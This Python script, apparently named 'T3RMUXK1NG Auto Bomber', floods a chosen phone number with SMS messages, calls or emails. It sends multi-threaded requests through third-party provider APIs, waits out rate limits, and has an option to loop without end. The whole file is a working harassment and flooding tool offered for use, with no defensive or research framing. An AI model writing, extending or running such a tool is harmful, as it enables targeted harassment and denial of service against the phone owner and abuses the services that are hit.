#!/usr/bin/python
# -*- coding: UTF-8 -*-
import os, json, time, string
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style
from utils.decorators import MessageDecorator
from utils.provider import APIProvider

mesgdcrt = MessageDecorator("icon")

def format_phone(num):
    num = [n for n in num if n in string.digits]
    return ''.join(num).strip()

def readisdc():
    with open("isdcodes.json") as file:
        return json.load(file)

def auto_bomb(cc, target, mode="sms", count=50, delay=1, threads=5, loop=False):
    isd_data = readisdc()
    country_codes = isd_data.get("isdcodes", {})

    if cc not in country_codes:
        mesgdcrt.FailureMessage(f"Country code {cc} not supported")
        return

    target = format_phone(target)
    if len(target) <= 6 or len(target) >= 12:
        mesgdcrt.FailureMessage("Invalid target number")
        return

    api = APIProvider(cc, target, mode, delay=delay)
    if len(APIProvider.api_providers) == 0:
        mesgdcrt.FailureMessage("No APIs available for this target")
        return

    mesgdcrt.SuccessMessage(f"Target: +{cc} {target}")
    mesgdcrt.SuccessMessage(f"Mode: {mode.upper()} | Count: {count} per cycle | Threads: {threads}")

    while True:
        success, failed = 0, 0
        target_count = count
        mesgdcrt.SectionMessage(f"Starting bombing cycle...")
        while success < target_count:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                jobs = []
                for i in range(target_count - success):
                    jobs.append(executor.submit(api.hit))
                for job in as_completed(jobs):
                    result = job.result()
                    if result is None:
                        mesgdcrt.WarningMessage("Rate limit reached, waiting 60s...")
                        time.sleep(60)
                        continue
                    if result:
                        success += 1
                    else:
                        failed += 1
                    if (success + failed) % 10 == 0 or success == target_count:
                        print(f"  Sent: {success + failed} | Success: {success} | Failed: {failed}")
        mesgdcrt.SuccessMessage(f"Cycle done: {success} sent, {failed} failed")
        if not loop:
            break
        mesgdcrt.WarningMessage(f"Loop mode active. Next cycle in {delay * 10}s...")
        time.sleep(delay * 10)

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="T3RMUXK1NG Auto Bomber")
    parser.add_argument("-cc", "--country-code", default="91", help="Country code (default: 91)")
    parser.add_argument("-t", "--target", required=True, help="Target phone number")
    parser.add_argument("-m", "--mode", choices=["sms", "call", "mail"], default="sms", help="Attack mode (default: sms)")
    parser.add_argument("-n", "--count", type=int, default=50, help="Number of attacks per cycle (default: 50)")
    parser.add_argument("-d", "--delay", type=float, default=1.0, help="Delay between attacks in seconds (default: 1)")
    parser.add_argument("-th", "--threads", type=int, default=5, help="Number of threads (default: 5)")
    parser.add_argument("-l", "--loop", action="store_true", help="Loop indefinitely")
    args = parser.parse_args()
    auto_bomb(args.country_code, args.target, args.mode, args.count, args.delay, args.threads, args.loop)
